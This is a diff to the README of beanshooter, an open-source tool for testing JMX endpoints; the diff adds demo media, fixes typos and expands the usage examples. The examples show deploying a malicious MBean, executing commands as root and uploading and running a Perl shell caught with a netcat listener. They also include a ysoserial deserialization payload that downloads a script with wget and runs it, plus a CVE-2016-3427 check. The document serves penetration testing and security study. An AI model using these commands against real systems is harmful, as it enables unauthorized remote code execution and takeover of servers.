@@ -3,6 +3,16 @@
 ----
 
 *Beanshooter* is a command line tool written in *Java*, which helps to identify common vulnerabilities on *JMX* endpoints.
+
+![](https://github.com/qtc-de/beanshooter/workflows/master%20maven%20CI/badge.svg?branch=master)
+![](https://github.com/qtc-de/beanshooter/workflows/develop%20maven%20CI/badge.svg?branch=develop)
+![](./resources/media/01-demo.gif)
+
+
+### Introduction
+
+----
+
 *JMX* stands for *Java Management Extensions* and can be used to monitor and configure the *Java Virtual Machine*
 from remote. Applications like *tomcat* or *JBoss* are often installed together with a *JMX* instance, which
 enables server administrators to monitor and manage the corresponding application.
@@ -21,9 +31,6 @@ malicious *MBean* objects and compromise the underlying application server.
 endpoints as well as for authenticated ones (assumed you have valid credentials and sufficient permissions). Furthermore,
 it can be used to test other vulnerabilities like insecure *Java Deserialization* or *CVE-2016-3427*. Also connections
 using the *JMXMP* protocol are supported.
-
-![](https://github.com/qtc-de/beanshooter/workflows/master%20maven%20CI/badge.svg?branch=master)
-![](https://github.com/qtc-de/beanshooter/workflows/develop%20maven%20CI/badge.svg?branch=develop)
 
 
 ### Installation
@@ -124,7 +131,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 20.50 seconds
 ```
 
-This output can be missleading, as *nmap* is not able to detect the *rmiregistry* right away. This is because the *rmiregistry* on
+This output can be misleading, as *nmap* is not able to detect the *rmiregistry* right away. This is because the *rmiregistry* on
 this server is configured for *TLS* usage, which breaks most of the common detection and enumeration tools. However, by looking
 at the high port that was successfully flagged as *Java RMI*, once can guess that one of the *SSL* ports has to be the *rmiregistry*.
 Using [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) (one of the few tools that support *SSL* protected
@@ -149,8 +156,8 @@ should look like this:
 ```console
 [qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 status
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.17.0.2... done!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.17.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Getting Status of MLet... done!
@@ -169,8 +176,8 @@ deploy can be found in the path that is specified in your configuration file (de
 ```console
 [qtc@kali ~]$ beanshooter --ssl --stager-host 172.17.0.1 --stager-port 8080 172.17.0.2 9010 deployAll
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.17.0.2... done!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.17.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Creating MBean 'MLet' for remote deploymet... done!
@@ -201,8 +208,8 @@ Now one can use the *status* or *ping* command to verify that the malicious *MBe
 ```console
 [qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 status
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.17.0.2... done!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.17.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Getting Status of MLet... done!
@@ -211,8 +218,8 @@ Now one can use the *status* or *ping* command to verify that the malicious *MBe
 [+]	malicious Bean is registered on the JMX server.
 [qtc@kali ~]$ beanshooter --ssl  172.17.0.2 9010 ping
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.17.0.2... done!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.17.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Sending ping to the server... done!
@@ -226,28 +233,42 @@ While this is also possible for the *tonka-bean*, *beanshooter* supports actions
 ```console
 [qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 execute id
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.17.0.2... done!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.17.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Sending command 'id' to the server... 
 [+] Servers answer is: uid=0(root) gid=0(root) groups=0(root)
 ```
 
-You can also use the *shell* action, to launch multiple commands as in a command shell:
+You can also use the *shell* action, to launch multiple commands as in a (pseudo) command shell. The shell also
+contains wrappers around the ``upload``, ``download`` and ``executeBackground`` actions of *beanshooter*:
 
 ```console
 [qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 shell
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.17.0.2... done!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.17.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Starting interactive shell...
 
 $ id
 uid=0(root) gid=0(root) groups=0(root)
+$ !upload ~/www/shell.pl /dev/shm/s.pl 
+[+] File upload finished. 170 bytes were written to /dev/shm/s.pl
+$ !background perl /dev/shm/s.pl
+Command is executed in the background.
 $ exit
+
+[qtc@kali ~]$ nc -vlp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:37522.
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Once you are done with your *MBean*, you should make sure to undeploy all changes that you have made to the server.
@@ -257,8 +278,8 @@ you should also remove the *MLet*. *beanshooter* makes the cleanup pretty easy, 
 ```console
 [qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 undeployAll
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.17.0.2... done!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.17.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Unregister malicious bean... done!
@@ -333,7 +354,7 @@ of protections:
 *Beanshooter* supports all these types of protections and corresponding examples can be found inside the
 ``README.md`` of the [docker-container](./.docker).
 
-Useful tipp: It is also possible to use *jconsole* to connect to a running *JMX* agent via *JMXMP*. Instead of simply specifying the host and port number for the connection,
+Useful tip: It is also possible to use *jconsole* to connect to a running *JMX* agent via *JMXMP*. Instead of simply specifying the host and port number for the connection,
 you have to use the *JMXMP* service URI ``service:jmx:jmxmp://<JMXMPHOST>:<JMXMPPORT>`` and you have to make sure that the *jmxremote_optional.jar* is inside your
 classpath.
 
@@ -342,20 +363,22 @@ classpath.
 
 -----
 
+![](./resources/media/02-deserialization-demo.gif)
+
 In case of authenticated *JMX* endpoints, it is pretty common that usage of *MLet* does not work, even with valid credentials.
 The following listing shows an attempt to deploy a malicious *MBean* on an authenticated *JMX* endpoint:
 
 ```console
 [qtc@kali ~]$ beanshooter --ssl  172.18.0.2 9010 status
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.18.0.2... failed!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.18.0.2... failed!
 [*]
 [-] The following exception was thrown: java.lang.SecurityException: Authentication failed! Credentials required
 [qtc@kali ~]$ beanshooter --ssl  --username controlRole --password control 172.18.0.2 9010 status
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.18.0.2... done!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.18.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Getting Status of MLet... done!
@@ -364,8 +387,8 @@ The following listing shows an attempt to deploy a malicious *MBean* on an authe
 [+]	malicious Bean is not registered on the JMX server.
 [qtc@kali ~]$ beanshooter --ssl  --username controlRole --password control 172.18.0.2 9010 deployAll
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.18.0.2... done!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.18.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Creating MBean 'MLet' for remote deploymet... failed!
@@ -376,14 +399,14 @@ In these cases it might still be possible to attack the *JMX* endpoint by using 
 project can be integrated to *beanshooter* by specifying the path to the corresponding *ysoserial .jar* file. This can be configured either in the configuration file or by using the
 ``--yso`` command line option. The default location is ``/opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar``.
 
-With *ysoserial* setup correctly, one can attempt a deserialization attack agains the target:
+With *ysoserial* setup correctly, one can attempt a deserialization attack against the target:
 
 ```console
 [qtc@kali ~]$ beanshooter --ssl --username controlRole --password control 172.18.0.2 9010 ysoserial CommonsCollections6 "wget -O /dev/shm/s.pl http://172.18.0.1:8000/shell.pl"
 [+] Creating ysoserial payload...done.
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.18.0.2... done!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.18.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Sending payload to 'getLoggerLevel'...
@@ -391,8 +414,8 @@ With *ysoserial* setup correctly, one can attempt a deserialization attack again
 [qtc@kali ~]$ beanshooter --ssl --username controlRole --password control 172.18.0.2 9010 ysoserial CommonsCollections6 "perl /dev/shm/s.pl"
 [+] Creating ysoserial payload...done.
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.18.0.2... done!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.18.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Sending payload to 'getLoggerLevel'...
@@ -418,8 +441,8 @@ the *pre-auth* attack only works against the *RMI* based connector:
 [+] cve-2016-3427 - Sending serialized Object as credential.
 [+]     An exception during the connection attempt is expected.
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.18.0.2... failed!
+[+]    RMI object tries to connect to different remote host: iinsecure.dev
+[+]    Redirecting the connection back to 172.18.0.2... failed!
 [*]
 [*] Caught SecurityException with content 'Authentication failed! Credentials should be String[] instead of java.util.HashSet'.
 [*]     Target is most likely vulnerable to cve-2016-3427.
@@ -462,7 +485,7 @@ beanClass=de.qtc.tonkabean.TonkaBean
 objectName=MLetTonkaBean:name=TonkaBean,id=1
 ```
 
-It is possible to overwrite each option by specifying a custom configuration file using the ``--config`` paramater. The custom config file does not need to contain
+It is possible to overwrite each option by specifying a custom configuration file using the ``--config`` parameter. The custom config file does not need to contain
 all options. Options that are not present were simply set to the default value. If you want your custom configuration to apply for each usage of *beanshooter*, you
 can also modify the [config.properties](./src/config.properties) file inside of the [src](./src) folder before compiling the project. 
 
